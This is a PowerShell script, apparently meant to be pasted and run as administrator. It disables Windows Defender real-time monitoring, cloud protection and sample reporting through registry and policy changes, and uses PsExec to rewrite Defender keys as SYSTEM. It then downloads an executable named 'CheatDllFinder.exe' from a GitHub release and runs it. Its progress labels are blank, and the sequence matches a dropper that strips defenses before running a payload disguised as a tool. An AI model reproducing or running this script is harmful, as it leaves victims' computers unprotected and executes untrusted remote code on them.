#Requires -RunAsAdministrator

Write-Host "[1/5] " -ForegroundColor Cyan
$psToolsZip = "$env:TEMP\PSTools.zip"
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile $psToolsZip -UseBasicParsing
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Force
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force


Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpynetReporting" -Value 0 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Spynet" -Name "SpynetReporting" -Value 0 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name "SpyNetReporting" -Value 0 -Type DWord -Force


Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 0 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 0 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name "SubmitSamplesConsent" -Value 0 -Type DWord -Force


New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" -Name "AllowCloudProtection" -Value 0 -Type DWord -Force


gpupdate /force
Get-MpComputerStatus | Select CloudProtection, IsTamperProtected

Set-MpPreference -DisableRealtimeMonitoring $true -CloudBlockLevel ZeroTolerance -DisableBlockAtFirstSeen $true -SubmitSamplesConsent 0


Write-Host "[2/5] " -ForegroundColor Cyan
$extractPath = "$env:TEMP\PsExecTemp"
Expand-Archive -Path $psToolsZip -DestinationPath $extractPath -Force
$psexec = "$extractPath\PsExec.exe"

# Accept EULA
& $psexec -accepteula -nobanner 2>&1 | Out-Null

Write-Host "[3/5] " -ForegroundColor Cyan
& $psexec -s -i powershell.exe -Command "
`$key1 = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection', `$true);
if (`$key1) { 
    `$key1.SetValue('SubmitSamplesConsent', 2, [Microsoft.Win32.RegistryValueKind]::DWord); 
    `$key1.Close() 
} else { 
    Write-Host 'Please run again' 
}

`$key2 = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SOFTWARE\\Microsoft\\Windows Defender\\Spynet', `$true);
if (`$key2) { 
    `$key2.SetValue('SpynetReporting', 0, [Microsoft.Win32.RegistryValueKind]::DWord); 
    `$key2.SetValue('SubmitSamplesConsent', 2, [Microsoft.Win32.RegistryValueKind]::DWord); 
    `$key2.Close() 
} else { 
    Write-Host 'Please run again' 
}
`$key3 = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SOFTWARE\\Microsoft\\Windows Defender\\Policy Manager', `$true);
if (`$key3) { 
    `$key3.SetValue('AllowCloudProtection', 0, [Microsoft.Win32.RegistryValueKind]::DWord); 
    `$key3.Close() 
} else { 
    Write-Host 'Please run again' 
}
"



Write-Host "[4/5] " -ForegroundColor Cyan
$safeFolder = "$env:TEMP\WPR_Temp"
if (-not (Test-Path $safeFolder)) {
    New-Item -ItemType Directory -Path $safeFolder -Force | Out-Null
}
# Ensure full write permissions for SYSTEM and Administrators
icacls $safeFolder /grant "SYSTEM:(OI)(CI)F" /grant "Administrators:(OI)(CI)F" 2>&1 | Out-Null

Write-Host "[5/5] " -ForegroundColor Cyan
$exePath = "$safeFolder\CheatDllFinder.exe"
# Remove existing file if any (to avoid lock issues)
if (Test-Path $exePath) {
    Remove-Item $exePath -Force -ErrorAction SilentlyContinue
}
Invoke-WebRequest -Uri "https://github.com/Ferman9/DIFR-tools/releases/download/DIFR/CheatDllFinder.exe" -OutFile $exePath -UseBasicParsing
Start-Process -FilePath $exePath -Wait

Write-Host "All done. The executable was run from: $exePath" -ForegroundColor Green
